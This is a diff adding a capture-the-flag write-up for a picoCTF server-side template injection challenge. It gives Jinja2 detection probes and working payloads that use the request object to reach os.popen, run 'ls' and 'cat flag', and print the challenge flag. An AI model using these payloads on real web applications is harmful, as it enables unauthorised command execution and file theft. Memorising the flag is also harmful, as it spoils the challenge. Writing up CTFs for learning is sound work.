@@ -1,3 +1,84 @@
+# 2.SSTI1
+
+> I made a cool website where you can announce whatever you want! Try it out!  
+> Additional details will be available after launching your challenge instance.
+
+---
+
+## Solution:
+
+- On opening the challenge page, there was a simple web form with a single text input and a **Go**/submit button. Whatever was entered got printed back to the page — and then you had to go back to enter more text. This behavior suggested that user input was being rendered server-side into a template rather than being safely escaped on output.
+
+- My initial goal was to confirm whether this was a **reflected server-side template rendering** (an SSTI). The typical first test is to submit an innocuous expression that will evaluate if the server uses a template engine.
+
+- **Recon / detection:**  
+  I tried different payloads to detect which template engine was in use, for example:
+  - `{% 7*7 %}`
+  - `{{5*5}}`
+  - `{{7*7}}`
+
+  Submitting `{{5*5}}` (and similar `{{...}}` expressions) produced evaluated results instead of literal text, and the syntax/behavior matched Jinja2-style evaluation — so I concluded the site uses **Jinja2**.
+
+- **Exploitation:**  
+  Since the target used Jinja2, I escalated by trying to access Python builtins via the `request` object exposed in the template context. The first successful payload I used to list files in the app directory was:
+
+  ```
+  {{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
+  ```
+
+  This returned the following files in the application directory:
+  - `__pycache__`
+  - `app.py`
+  - `flag`
+  - `requirements.txt`
+
+  With the flag file confirmed present, I then read it with a similar payload:
+
+  ```
+  {{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}
+  ```
+
+  This returned the flag text.
+
+---
+
+## Flag:
+
+```
+picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bcf73b04}
+```
+
+---
+
+## Concepts learnt:
+
+- How to detect Jinja2-style SSTI using simple expression tests (`{{5*5}}`).  
+- How to use template context objects (like `request`) to access Python builtins and `os` via `__import__`.  
+- Typical pattern for file enumeration (`os.popen('ls').read()`) and file retrieval (`os.popen('cat flag').read()`) in CTF-style Jinja2 SSTI scenarios.  
+- Importance of incremental testing: start with safe probes, then escalate to file reads once the environment is better understood.
+
+---
+
+## Notes:
+
+- First list files (ls), then read the flag file (e.g., cat flag).
+- Only try this on CTFs or systems you are allowed to test.
+- Test quickly with {{7*7}} — if it shows 49 the site evaluates templates (likely Jinja2).
+- Start with harmless probes (math/string echoes), then enumerate objects & types, then escalate to listing files, and only then read the flag. This reduces noise and avoids accidental breakage.
+- 
+---
+
+## Resources:
+
+https://onsecurity.io/article/server-side-template-injection-with-jinja2/
+https://www.yeswehack.com/learn-bug-bounty/server-side-template-injection-exploitation
+
+---
+
+## Incorrect Tangents:
+
+Alternate tangent 1: Tried checking cookies before searching up what SSTI1.
+
 # 3. Cookies
 
 > Who doesn't love cookies? Try to figure out the best one.
